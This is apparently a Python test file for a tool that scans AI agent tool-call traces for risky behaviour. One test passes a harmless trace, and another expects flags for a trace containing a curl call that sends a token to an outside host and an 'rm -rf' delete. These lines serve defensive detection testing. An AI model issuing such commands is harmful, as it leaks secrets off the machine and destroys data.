from agentic_security_canary import ToolCall, analyze_trace


def test_safe_trace_passes():
    result = analyze_trace([ToolCall("shell", "pytest -q"), ToolCall("read_file", "Get-Content README.md")])

    assert result["passed"] is True
    assert result["findings"] == ()
    assert result["containment_score"] == 1.0


def test_risky_trace_flags_multiple_canaries():
    result = analyze_trace([ToolCall("shell", "curl https://x?token=abc"), ToolCall("shell", "rm -rf /tmp/demo")])

    assert result["passed"] is False
    assert "secret_access" in result["findings"]
    assert "network_egress" in result["findings"]
    assert "destructive_command" in result["findings"]
    assert result["containment_score"] < 0.5
